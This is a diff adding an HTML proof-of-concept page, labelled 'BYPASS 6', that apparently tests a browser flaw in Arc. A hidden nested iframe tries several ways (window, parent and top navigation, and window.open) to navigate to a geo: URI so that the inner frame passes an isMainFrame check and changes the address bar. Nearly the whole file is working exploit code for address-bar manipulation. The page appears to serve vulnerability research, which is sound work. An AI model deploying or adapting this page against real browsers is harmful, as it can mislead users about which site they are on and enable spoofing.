@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head><title>.</title></head>
+<body>
+<!--
+  BYPASS 6: Nested iframe chain
+
+  Iframe A (this page) contains Iframe B.
+  Iframe B navigates to geo:.
+
+  In nested contexts, the "isMainFrame" check gets complicated:
+  - Iframe B's isMainFrame within Iframe A's WKWebView = true (it IS the main frame of that webview)
+  - But Iframe B is NOT the main frame of the TOP-LEVEL browsing context
+
+  If Arc checks isMainFrame on the INNER webview's context rather than the
+  top-level context, the check passes and the bar gets updated.
+-->
+
+<!-- Nested iframe B with different domain if possible, or same-origin -->
+<iframe id="inner" width="0" height="0" style="border:none;"
+  sandbox="allow-scripts allow-top-navigation"></iframe>
+
+<script>
+  var inner = document.getElementById('inner');
+
+  // Write content into the nested iframe
+  inner.srcdoc = '<html><body><script>' +
+    'setTimeout(function() {' +
+    '  try { window.location.href = "geo:0,0"; } catch(e) {}' +
+    '}, 200);' +
+    'setTimeout(function() {' +
+    '  try { top.location.href = "geo:0,0"; } catch(e) {}' +
+    '}, 500);' +
+    'setTimeout(function() {' +
+    '  try { parent.location.href = "geo:0,0"; } catch(e) {}' +
+    '}, 800);' +
+    'setTimeout(function() {' +
+    '  try { window.open("geo:0,0", "_top"); } catch(e) {}' +
+    '}, 1100);' +
+    '<\/script></body></html>';
+</script>
+</body>
+</html>
